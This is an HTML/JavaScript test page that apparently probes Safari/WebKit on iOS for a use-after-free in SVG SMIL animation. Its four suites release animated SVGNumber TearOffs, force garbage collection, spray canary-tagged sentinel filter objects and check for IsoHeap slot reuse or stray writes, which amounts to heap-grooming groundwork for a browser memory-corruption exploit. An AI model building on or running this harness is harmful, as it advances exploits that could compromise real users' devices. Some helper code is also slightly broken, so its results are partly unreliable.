<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v67 — fixed release + exact canaries + frame-escape UAF</title>
<style>
*{box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:12px;padding:12px;margin:0}
h2{color:#00ff88;margin:6px 0;font-size:14px}
#controls{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
button{background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;padding:6px 12px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px}
button:active{background:#00ff88;color:#0a0a0a}
button.run-all{background:#003300;border-color:#00ff88;font-weight:bold}
button.copy-btn{background:#1a1a2e;border-color:#00aaff;color:#00aaff}
button.copy-btn:active{background:#00aaff;color:#0a0a0a}
button.clear-btn{border-color:#ff4444;color:#ff4444}
#out{border:1px solid #222;padding:8px;min-height:100px;max-height:70vh;overflow-y:auto}
pre{white-space:pre-wrap;word-break:break-all;margin:1px 0;line-height:1.4}
.hit{color:#00ff88}.miss{color:#ff4444}.warn{color:#ffaa00}.info{color:#888}
.suite-hdr{color:#00aaff;margin-top:6px}
#copy-toast{position:fixed;bottom:20px;right:20px;background:#00aaff;color:#000;padding:6px 14px;border-radius:4px;font-family:monospace;font-size:12px;opacity:0;transition:opacity 0.2s;pointer-events:none}
</style>
</head>
<body>
<h2>SVG UAF v67 — fixed zero-ref release · exact float32 canaries · frame-escape UAF probe</h2>
<div id="controls">
  <button class="run-all" onclick="runAll()">▶ Run All</button>
  <button onclick="runSuite('ADR64')">ADR64: Fix ADR62 — true zero-ref TearOff release UAF probe</button>
  <button onclick="runSuite('ADR65')">ADR65: Fix ADR63 — exact float32 canaries IsoHeap reuse oracle</button>
  <button onclick="runSuite('ADR66')">ADR66: Frame-escape test — release per-frame TearOff after anim advances</button>
  <button onclick="runSuite('ADR67')">ADR67: Mass spray — 100 per-frame allocs, all released, sentinel corruption check</button>
  <button class="copy-btn" onclick="copyAll()">⎘ Copy All</button>
  <button class="clear-btn" onclick="clearOut()">✕ Clear</button>
</div>
<div id="out"></div>
<div id="copy-toast">Copied!</div>
<script>
// Global error catcher — surfaces real errors the sandbox hides
window.onerror=function(msg,src,line,col,err){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[GLOBAL ERR] '+msg+' @ line '+line+(err&&err.stack?'\n'+err.stack:'');d.appendChild(p);d.scrollTop=d.scrollHeight;}
  return false;
};
window.addEventListener('unhandledrejection',function(e){
  var d=document.getElementById('out');
  if(d){var p=document.createElement('pre');p.className='miss';p.textContent='[UNHANDLED PROMISE] '+(e.reason&&e.reason.stack?e.reason.stack:String(e.reason));d.appendChild(p);}
});

var SVG_NS='http://www.w3.org/2000/svg';
function L(s,cls){
  var d=document.getElementById('out');
  var p=document.createElement('pre');
  if(cls)p.className=cls;
  p.textContent=s;
  d.appendChild(p);
  d.scrollTop=d.scrollHeight;
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=document.getElementById('out').querySelectorAll('pre');
  var text=Array.from(lines).map(function(p){return p.textContent;}).join('\n');
  var toast=document.getElementById('copy-toast');
  try{
    navigator.clipboard.writeText(text).then(function(){
      toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);
    }).catch(function(){fallbackCopy(text,toast);});
  }catch(e){fallbackCopy(text,toast);}
}
function fallbackCopy(text,toast){
  var ta=document.createElement('textarea');ta.value=text;
  ta.style.cssText='position:fixed;top:-9999px;left:-9999px';
  document.body.appendChild(ta);ta.select();
  try{document.execCommand('copy');toast.style.opacity='1';setTimeout(function(){toast.style.opacity='0';},1500);}
  catch(e){L('Copy failed: '+e.message,'miss');}
  document.body.removeChild(ta);
}

var _dv=new DataView(new ArrayBuffer(8));
function f32bits(f){_dv.setFloat32(0,f,true);return _dv.getUint32(0,true);}
function f32hex(f){return'0x'+f32bits(f).toString(16).padStart(8,'0');}
function f32exact(v){
  // round-trip through float32 to get the exact float32-representable value
  _dv.setFloat32(0,v,true);return _dv.getFloat32(0,true);
}
function isExactF32(v){return f32exact(v)===v;}

function f64bits(f){_dv.setFloat64(0,f,true);return{lo:_dv.getUint32(0,true),hi:_dv.getUint32(4,true)};}
function f64hex(f){var b=f64bits(f);return'0x'+b.hi.toString(16).padStart(8,'0')+b.lo.toString(16).padStart(8,'0');}
function isPointerLike32(u){return u>=0x4F000000&&u<=0x52FFFFFF;}
function isPointerBits64(f){
  if(!isFinite(f)||isNaN(f))return false;
  var b=f64bits(f);return b.hi>=0x00000001&&b.hi<=0x00007fff;
}

// EXACT float32 canary generator — values are guaranteed exactly representable
// Use small multiples: 1000*i for i=1..100, all < 16777216 = 2^24, exact in f32
function makeCanary(i){return (i+1)*1000;} // 1000,2000,...,100000 — all exact in f32
function checkCanary(v,i){
  var expected=makeCanary(i);
  var got=f32exact(v); // normalize v to float32 precision
  // float32 exact comparison after round-trip
  return Math.abs(v-expected)<0.5; // within 0.5 = same integer
}

function gcHard(){
  var a=[];for(var i=0;i<500000;i++)a.push({x:i});a=null;
  var t=new Array(200000).fill(null).map(function(){return{};});t=null;
  var a2=[];for(var i=0;i<300000;i++)a2.push({x:i});a2=null;
  try{var ab=new ArrayBuffer(1024*1024*8);ab=null;}catch(e){}
}
function gcDOM(){
  var c=document.createElement('div');document.body.appendChild(c);
  for(var i=0;i<5000;i++){var el=document.createElement('span');c.appendChild(el);}
  c.innerHTML='';c.remove();
  for(var j=0;j<500;j++){var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);s.remove();}
}
function gcFull(){gcHard();gcDOM();gcHard();}

// TRUE zero-ref release helper
// JS closures capture variables by reference. To truly release an object,
// we must ensure NO variable anywhere in any scope holds it.
// Strategy: use a helper function that receives and destroys internally,
// then immediately invoke GC from OUTSIDE that scope.
function trueRelease(holder){
  // holder is a container object: {ref: tearoff}
  // We null the ref inside here, then the container itself is only held by the caller
  holder.ref=null;
  // After this function returns, holder is still on caller's stack
  // Caller must null holder too. This is just the inner clear.
}

var suites={};
function runSuite(name){
  L('','');L('══ '+name+' ══════════════════════════════════','suite-hdr');
  try{suites[name]();}
  catch(e){L('[SUITE CRASH] '+name+': '+(e&&e.stack?e.stack:String(e)),'miss');}
}
function runAll(){
  ['ADR64','ADR65','ADR66','ADR67'].forEach(function(n){runSuite(n);});
}

function makeLiveAnimatedFilter(id,fromVal0,toVal0,dur){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','200');svg.setAttribute('height','200');
  document.body.appendChild(svg);
  var defs=document.createElementNS(SVG_NS,'defs');svg.appendChild(defs);
  var filt=document.createElementNS(SVG_NS,'filter');
  filt.id=id;defs.appendChild(filt);
  var fromVals=[],toVals=[];
  for(var i=0;i<20;i++){fromVals.push(i===0?fromVal0:0);toVals.push(i===0?toVal0:0);}
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');fe.setAttribute('values',fromVals.join(' '));
  filt.appendChild(fe);
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('width','100');rect.setAttribute('height','100');
  rect.setAttribute('filter','url(#'+id+')');
  svg.appendChild(rect);
  var anim=document.createElementNS(SVG_NS,'animate');
  anim.setAttribute('attributeName','values');
  anim.setAttribute('from',fromVals.join(' '));
  anim.setAttribute('to',toVals.join(' '));
  anim.setAttribute('dur',(dur||5)+'s');
  anim.setAttribute('repeatCount','indefinite');
  fe.appendChild(anim);
  try{anim.beginElement();}catch(e){}
  return{svg:svg,filt:filt,fe:fe,anim:anim,rect:rect};
}

function makeSentinelFe(id,canaryVal){
  var svg=document.createElementNS(SVG_NS,'svg');
  document.body.appendChild(svg);
  var fe=document.createElementNS(SVG_NS,'feColorMatrix');
  fe.setAttribute('type','matrix');
  var v=[];for(var i=0;i<20;i++)v.push(i===0?canaryVal:0);
  fe.setAttribute('values',v.join(' '));
  svg.appendChild(fe);
  return{svg:svg,fe:fe,t:fe.values.baseVal.getItem(0),canary:canaryVal};
}

// ═══════════════════════════════════════════════════════════════
// ADR64 — Fix ADR62: TRUE zero-reference TearOff release UAF probe
//
// ADR62 FLAW: variable 't0ref' still held the TearOff after 't0=null'.
// The C++ SVGNumber was never freed. No UAF happened.
//
// Fix: use an IIFE (immediately invoked function) to hold T[0],
// then let the IIFE scope go out completely. After IIFE returns,
// the ONLY way T[0] survives is if SMIL holds a RefPtr to it.
// If SMIL does NOT hold RefPtr, T[0]'s SVGNumber is freed.
//
// Test matrix:
// T1: Collect T[0], IIFE releases it, GC 5 rounds, alloc sentinel C
//     → Does SMIL write animated value to C? (would mean C landed at freed addr)
// T2: Same but alloc C BEFORE IIFE (so C lands elsewhere first)
//     → Control: C should not be written to
// T3: Collect T[0], IIFE releases it, GC, then collect T[1] immediately
//     → Does T[1] have the SAME value as T[0] (reused slot)?
//     → vs T[0]+T[1] from same frame test
//
// Also: check if the IIFE-released TearOff's C++ object is accessible
// through any other path (animVal.getItem(0) fresh call)
// ═══════════════════════════════════════════════════════════════
suites['ADR64']=function(){
  L('ADR64: True zero-ref release UAF probe','info');
  var ctx=makeLiveAnimatedFilter('f64',3000,0,8);

  setTimeout(function(){
    // T1: IIFE release
    L('ADR64 T1: collect T[0] inside IIFE, release completely','info');
    var t0val=null;
    // Capture value from T[0] for reference
    (function(){
      var t=ctx.fe.values.animVal.getItem(0);
      t0val=t.value;
      L('  T[0] inside IIFE: value='+t0val.toFixed(3),'info');
      // t goes out of scope when IIFE returns
    })();

    // Multi-round GC after IIFE
    gcFull();gcFull();gcFull();
    L('ADR64 T1: IIFE exited, 3x gcFull done, T[0] value was '+t0val.toFixed(3),'info');

    // Alloc sentinel C immediately after
    var C=makeSentinelFe('sentinel_c',55555);
    L('ADR64 T1: alloc C (canary=55555): C.value='+C.t.value,'info');

    // Wait for 3 SMIL frames to tick
    var frameWait=0;
    function waitFrames(){
      frameWait++;
      var animNow=ctx.fe.values.animVal.getItem(0).value;
      L('  frame+'+frameWait+' animVal='+animNow.toFixed(3),'info');
      if(frameWait<3) requestAnimationFrame(waitFrames);
      else {
        var cAfter=C.t.value;
        L('ADR64 T1: C.value after 3 SMIL frames='+cAfter,'info');
        if(cAfter!==55555){
          L('★★★ ADR64 T1: C WRITTEN TO by SMIL! '+cAfter+' bits='+f32hex(cAfter),'hit');
        } else {
          L('ADR64 T1: C unchanged (SMIL did not write to it)','info');
        }
        C.svg.remove();
        doT2();
      }
    }
    requestAnimationFrame(waitFrames);

    function doT2(){
      L('ADR64 T2: alloc D BEFORE releasing T_frame, then release — control test','info');
      // T2: alloc D first (different address), then release TearOff
      var D=makeSentinelFe('sentinel_d',44444);
      L('ADR64 T2: D.value='+D.t.value,'info');

      (function(){
        var t=ctx.fe.values.animVal.getItem(0);
        L('  T_frame inside IIFE: value='+t.value.toFixed(3),'info');
      })();
      gcFull();gcFull();

      var d2=0;
      function waitT2(){
        d2++;
        var an=ctx.fe.values.animVal.getItem(0).value;
        if(d2<3) requestAnimationFrame(waitT2);
        else {
          var dAfter=D.t.value;
          L('ADR64 T2: D.value after 3 frames='+dAfter,'info');
          if(dAfter!==44444) L('★★★ ADR64 T2: D WRITTEN TO (unexpected!): '+dAfter,'hit');
          else L('ADR64 T2: D unchanged (control OK)','info');
          D.svg.remove();
          doT3();
        }
      }
      requestAnimationFrame(waitT2);
    }

    function doT3(){
      L('ADR64 T3: release T[0], immediately collect T[1] — same IsoHeap slot reuse?','info');
      var savedV0=null;
      // Collect T[0]
      (function(){
        var t=ctx.fe.values.animVal.getItem(0);
        savedV0=t.value;
        L('  T[0].value='+savedV0.toFixed(3),'info');
      })();
      gcFull();gcFull();gcFull();

      // Collect T[1] on next frame
      requestAnimationFrame(function(){
        var t1=ctx.fe.values.animVal.getItem(0);
        var v1=t1.value;
        L('  T[1].value='+v1.toFixed(3)+' (expected ~'+savedV0.toFixed(3)+' - delta ~6)','info');
        L('  T[1] bits='+f32hex(v1),'info');
        if(Math.abs(v1-savedV0)<0.5){
          L('★ ADR64 T3: T[1] has SAME value as T[0]! Possible IsoHeap slot reuse','warn');
        } else {
          L('ADR64 T3: T[1] has different value (new alloc, expected behavior)','info');
        }
        ctx.svg.remove();
      });
    }
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR65 — Fix ADR63: EXACT float32 canaries — IsoHeap reuse oracle
//
// ADR63 FLAW: canary values 77770001, 77770002... are NOT exactly
// representable as float32. All "corruption" was precision quantization.
//
// Fix: use canary values that are EXACTLY representable in float32.
// Rule: integers < 2^24 = 16,777,216 are exact in float32.
// We use: canary[i] = (i+1)*1000
// So sentinel[0]=1000, sentinel[1]=2000... sentinel[49]=50000
// All < 50000 < 16M → exact. Any value change is REAL corruption.
//
// Protocol same as ADR63:
// 1. Alloc 50 sentinels with exact canaries
// 2. Collect 50 per-frame animVal TearOffs
// 3. Release ALL 50 TearOffs via IIFEs + multiple gcFull rounds
// 4. Alloc 50 probes with exact canaries
// 5. Check sentinels and probes for real corruption
//
// Also: add a SMIL-advance check — after probe allocs, wait 5 frames
// and re-check probes. If SMIL writes to a probe, we have UAF write.
// ═══════════════════════════════════════════════════════════════
suites['ADR65']=function(){
  L('ADR65: Exact f32 canaries — IsoHeap reuse oracle (ADR63 fixed)','info');

  // Verify canary scheme is exact f32
  var canaryOK=true;
  for(var i=0;i<50;i++){
    var c=makeCanary(i);
    if(!isExactF32(c)){L('ADR65: canary['+i+']='+c+' is NOT exact f32!','miss');canaryOK=false;}
  }
  L('ADR65: canary check: '+(canaryOK?'all 50 exact in f32':'SOME INEXACT - ABORT'),'info');
  if(!canaryOK){L('ADR65: aborted','miss');return;}

  // Step 1: Alloc sentinels
  var sentinels=[];
  for(var i=0;i<50;i++){
    var c=makeCanary(i);
    sentinels.push(makeSentinelFe('s65_'+i,c));
  }
  L('ADR65: 50 sentinels allocated (canary[0]=1000, canary[49]=50000)','info');

  // Step 2: Start animation and collect 50 per-frame TearOffs
  var ctx=makeLiveAnimatedFilter('f65',5000,0,10);
  var frameT=[];
  var fc=0;

  setTimeout(function(){
    function collectF(){
      frameT.push(ctx.fe.values.animVal.getItem(0));
      fc++;
      if(fc<50) requestAnimationFrame(collectF);
      else afterCollect();
    }
    requestAnimationFrame(collectF);
  },100);

  function afterCollect(){
    L('ADR65: 50 per-frame TearOffs collected','info');
    L('ADR65: range='+frameT[0].value.toFixed(1)+' to '+frameT[49].value.toFixed(1),'info');
    var allDiff=frameT.every(function(t,i){return i===0||t!==frameT[0];});
    L('ADR65: all different? '+allDiff,'info');

    // Verify sentinels BEFORE release
    var preOK=sentinels.every(function(s,i){return checkCanary(s.t.value,i);});
    L('ADR65: sentinels before release: '+(preOK?'ALL OK':'SOME BAD!'),preOK?'info':'miss');

    // Step 3: Release ALL 50 TearOffs via IIFE — truly zero refs
    (function(){
      var refs=frameT;
      frameT=null;
      // refs is local, goes out of scope at end of IIFE
      // refs[0..49] = null each (belt+suspenders)
      for(var i=0;i<refs.length;i++) refs[i]=null;
    })();

    // Multiple heavy GC rounds
    for(var r=0;r<5;r++) gcFull();
    L('ADR65: 50 TearOffs IIFE-released + 5x gcFull done','info');

    // Verify sentinels AFTER release (before probe alloc)
    var midBad=[];
    sentinels.forEach(function(s,i){
      if(!checkCanary(s.t.value,i)){
        midBad.push({i:i,expected:makeCanary(i),got:s.t.value});
      }
    });
    if(midBad.length>0){
      L('★ ADR65: SENTINELS CORRUPTED BEFORE probe alloc (real corruption!):','hit');
      midBad.forEach(function(x){L('  S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3),'hit');});
    } else {
      L('ADR65: all 50 sentinels intact after TearOff release (no corruption pre-probe)','info');
    }

    // Step 4: Alloc 50 probes with exact canaries (different range: (i+51)*1000)
    var probes=[];
    for(var i=0;i<50;i++){
      var c=(i+51)*1000; // 51000..100000, all exact f32
      probes.push(makeSentinelFe('p65_'+i,c));
    }
    L('ADR65: 50 probes allocated (51000..100000)','info');

    // Step 5: Check sentinels and probes immediately
    var sentBad=[];
    sentinels.forEach(function(s,i){
      if(!checkCanary(s.t.value,i)) sentBad.push({i:i,expected:makeCanary(i),got:s.t.value});
    });
    var probeBad=[];
    probes.forEach(function(p,i){
      var expected=(i+51)*1000;
      if(Math.abs(p.t.value-expected)>0.5) probeBad.push({i:i,expected:expected,got:p.t.value});
    });

    if(sentBad.length>0){
      L('★★★ ADR65: '+sentBad.length+' SENTINELS CORRUPTED after probe alloc!','hit');
      sentBad.slice(0,5).forEach(function(x){L('  S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3),'hit');});
    } else {
      L('ADR65: all sentinels intact after probe alloc','info');
    }
    if(probeBad.length>0){
      L('★★★ ADR65: '+probeBad.length+' PROBES have wrong values (IsoHeap reuse of frame slots!)','hit');
      probeBad.slice(0,5).forEach(function(x){L('  P['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3),'hit');});
    } else {
      L('ADR65: all probes have correct canaries (bump-only: probes landed AFTER frame allocs)','info');
    }

    // Step 6: Wait 5 SMIL frames, re-check probes for SMIL writes
    var waitF=0;
    function waitSmil(){
      waitF++;
      if(waitF<5){requestAnimationFrame(waitSmil);return;}
      L('ADR65 T6: after 5 SMIL frames, re-checking probes...','info');
      var smilBad=[];
      probes.forEach(function(p,i){
        var expected=(i+51)*1000;
        if(Math.abs(p.t.value-expected)>0.5) smilBad.push({i:i,expected:expected,got:p.t.value});
      });
      if(smilBad.length>0){
        L('★★★ ADR65 T6: SMIL WROTE TO PROBES! UAF write confirmed:','hit');
        smilBad.forEach(function(x){L('  P['+x.i+']: expected '+x.expected+' → SMIL wrote '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
      } else {
        L('ADR65 T6: all probes still correct after 5 SMIL frames (no UAF write via probe)','info');
      }

      // Cleanup
      sentinels.forEach(function(s){s.svg.remove();});
      probes.forEach(function(p){p.svg.remove();});
      ctx.svg.remove();
    }
    requestAnimationFrame(waitSmil);
  }
};

// ═══════════════════════════════════════════════════════════════
// ADR66 — Frame-escape test: release per-frame TearOff AFTER animation advances
//
// Core question: when the SMIL engine moves to frame N+1, does it:
// (a) Hold a RefPtr to frame N's C++ SVGNumber (→ won't be freed when we release TearOff)
// (b) Hold a RAW pointer (→ freed when TearOff released → dangling ptr → UAF write)
// (c) Hold NO reference (→ freed when TearOff released → no UAF)
//
// Test:
//   1. Collect T[frame_0] INSIDE a closure
//   2. Wait for frame_0 + 5 more frames (animation has MOVED PAST frame_0)
//   3. RELEASE T[frame_0] by letting closure scope die
//   4. Force GC (multiple rounds)
//   5. Alloc sentinel S with exact canary
//   6. Continue animation for 5 more frames
//   7. Check S.value:
//      - S.value = canary → no UAF (SMIL doesn't have dangling ptr to frame_0's SVGNumber)
//      - S.value = animated float ≠ canary → UAF WRITE CONFIRMED!
//
// Also: check fresh av.getItem(0) on each frame — it should NOT return T[frame_0]
// (that was 6+ frames ago). The cached TearOff should be the current frame's.
// ═══════════════════════════════════════════════════════════════
suites['ADR66']=function(){
  L('ADR66: Frame-escape UAF test — release per-frame TearOff after 5 frames advance','info');
  var ctx=makeLiveAnimatedFilter('f66',4000,0,10);

  setTimeout(function(){
    // Collect T[0] inside a container that we can null
    var holder={ref:null,val:null};

    requestAnimationFrame(function(){
      holder.ref=ctx.fe.values.animVal.getItem(0);
      holder.val=holder.ref.value;
      L('ADR66: T[0] captured, value='+holder.val.toFixed(3),'info');

      // Wait 5 more frames
      var skip=0;
      function skipFrames(){
        skip++;
        var cur=ctx.fe.values.animVal.getItem(0).value;
        L('  frame+'+skip+' av='+cur.toFixed(3)+' (T[0] held: holder.ref.value='+holder.ref.value.toFixed(3)+')','info');
        if(skip<5){requestAnimationFrame(skipFrames);return;}

        // Now truly release holder.ref USING IIFE
        var capturedVal=holder.val;
        (function(h){
          // h.ref holds the TearOff here
          h.ref=null;
          h=null;
        })(holder);
        holder=null;

        // Multi-round GC
        for(var r=0;r<5;r++) gcFull();
        L('ADR66: T[0] IIFE-released + 5x gcFull. Captued val was '+capturedVal.toFixed(3),'info');

        // Alloc sentinel S immediately after release
        var S=makeSentinelFe('s66',12345);
        L('ADR66: sentinel S allocated (canary=12345): S.value='+S.t.value,'info');

        // Continue animation for 5 more frames, checking S
        var post=0;
        function checkPost(){
          post++;
          var av=ctx.fe.values.animVal.getItem(0).value;
          var sv=S.t.value;
          var sBits=f32hex(sv);
          if(sv!==12345){
            L('★★★ ADR66 frame+'+post+': S.value CHANGED! was 12345 now '+sv.toFixed(3)+' bits='+sBits+' av='+av.toFixed(3),'hit');
          } else {
            L('  frame+'+post+' av='+av.toFixed(3)+' S=12345 (intact)','info');
          }
          if(post<5) requestAnimationFrame(checkPost);
          else {
            L('ADR66: final S.value='+S.t.value,'info');
            if(S.t.value===12345){
              L('ADR66: S unchanged — SMIL does NOT have dangling ptr to frame_0 SVGNumber','info');
              L('ADR66: Either SMIL holds RefPtr (SVGNumber not freed) or bump-only (S landed elsewhere)','info');
            }
            S.svg.remove();
            ctx.svg.remove();
          }
        }
        requestAnimationFrame(checkPost);
      }
      requestAnimationFrame(skipFrames);
    });
  },200);
};

// ═══════════════════════════════════════════════════════════════
// ADR67 — Mass spray + frame-escape: 100 per-frame allocs all released
//
// Scale up ADR66 to 100 TearOffs (all IIFE-released) + 100 sentinels.
// Rationale: if IsoHeap has a free list (LIFO), releasing 100 slots
// and then allocating 100 sentinels might reuse those slots.
// With exact canaries, we can detect:
//   a) IsoHeap free list (LIFO reuse): some sentinel gets wrong initial value
//   b) SMIL UAF write: sentinel value changes AFTER SMIL frames tick
//
// Also: measure the per-frame animation value DELTA to estimate
// how many IsoHeap SVGNumber allocs happen during the collection period.
// If each animVal.getItem(0) per frame = 1 alloc, 100 frames = 100 allocs.
// After release: 100 freed IsoHeap slots. 100 probes should fill them
// IF IsoHeap has a free list.
//
// iOS 26.5.2 bmalloc IsoHeap behavior:
// - If BUMP-ONLY: freed slots are LOST, probes go to new addresses
// - If FREE LIST: freed slots are reused (LIFO or FIFO)
// This test disambiguates.
// ═══════════════════════════════════════════════════════════════
suites['ADR67']=function(){
  L('ADR67: Mass 100-frame spray + all released + 100 sentinel probe + SMIL watch','info');
  var ctx=makeLiveAnimatedFilter('f67',8000,0,15);

  // Verify 100 canaries are exact f32
  var ok100=true;
  for(var i=0;i<100;i++){if(!isExactF32((i+1)*100)){ok100=false;break;}}
  L('ADR67: canary scheme (i+1)*100: '+(ok100?'all 100 exact in f32':'FAIL'),'info');

  setTimeout(function(){
    // Collect 100 per-frame TearOffs
    var store=[];
    var fc2=0;
    function collect100(){
      store.push(ctx.fe.values.animVal.getItem(0));
      fc2++;
      if(fc2<100) requestAnimationFrame(collect100);
      else afterCollect100();
    }
    requestAnimationFrame(collect100);
  },100);

  function afterCollect100(){
    L('ADR67: 100 per-frame TearOffs collected','info');
    L('ADR67: value range: '+store[0].value.toFixed(1)+' to '+store[99].value.toFixed(1),'info');
    var allDiff=store.every(function(t,i){return i===0||t!==store[0];});
    L('ADR67: all 100 different? '+allDiff,'info');

    // Estimated per-frame delta
    var delta=(store[0].value-store[99].value)/99;
    L('ADR67: avg per-frame delta='+delta.toFixed(3),' info');
    L('ADR67: 100 per-frame SVGNumber IsoHeap allocs confirmed','info');

    // IIFE release ALL 100
    (function(){
      var refs=store;
      store=null;
      for(var i=0;i<refs.length;i++) refs[i]=null;
    })();
    for(var r=0;r<5;r++) gcFull();
    L('ADR67: 100 TearOffs released + 5x gcFull','info');

    // Alloc 100 sentinels with exact canaries: (i+1)*100 → 100,200,...,10000
    var sents=[];
    for(var i=0;i<100;i++){
      var c=(i+1)*100;
      sents.push(makeSentinelFe('s67_'+i,c));
    }
    L('ADR67: 100 sentinels allocated (100..10000)','info');

    // Immediate check: any wrong initial value = IsoHeap free list reuse
    var wrongInit=[];
    sents.forEach(function(s,i){
      var expected=(i+1)*100;
      if(Math.abs(s.t.value-expected)>0.5) wrongInit.push({i:i,expected:expected,got:s.t.value});
    });
    if(wrongInit.length>0){
      L('★★★ ADR67: '+wrongInit.length+' sentinels have WRONG INITIAL values (IsoHeap reused freed slots!)','hit');
      L('ADR67: This means bmalloc IsoHeap HAS a free list on iOS 26.5.2','hit');
      wrongInit.slice(0,8).forEach(function(x){L('  S['+x.i+']: expected '+x.expected+' got '+x.got.toFixed(3)+' bits='+f32hex(x.got),'hit');});
    } else {
      L('ADR67: all 100 sentinels initialized correctly (bump-only OR correct init before any reuse)','info');
    }

    // Watch all 100 sentinels for SMIL writes over 10 frames
    var fw=0;
    var smilWrites=[];
    function watchFrames(){
      fw++;
      sents.forEach(function(s,i){
        var expected=(i+1)*100;
        var v=s.t.value;
        if(Math.abs(v-expected)>0.5){
          // New corruption? check if already logged
          var already=smilWrites.some(function(x){return x.i===i;});
          if(!already){
            smilWrites.push({i:i,expected:expected,got:v,frame:fw});
            L('★★★ ADR67 frame+'+fw+': S['+i+'] SMIL WRITE! expected '+expected+' got '+v.toFixed(3)+' bits='+f32hex(v),'hit');
          }
        }
      });
      if(fw<10) requestAnimationFrame(watchFrames);
      else {
        L('ADR67: watched 10 frames, total SMIL writes='+smilWrites.length,'info');
        if(smilWrites.length===0){
          L('ADR67: no SMIL writes to sentinels — UAF write not triggered via this path','info');
          L('ADR67: SMIL appears to hold RefPtr to animated SVGNumbers (not raw ptr)','info');
        }
        sents.forEach(function(s){s.svg.remove();});
        ctx.svg.remove();
      }
    }
    requestAnimationFrame(watchFrames);
  }
};
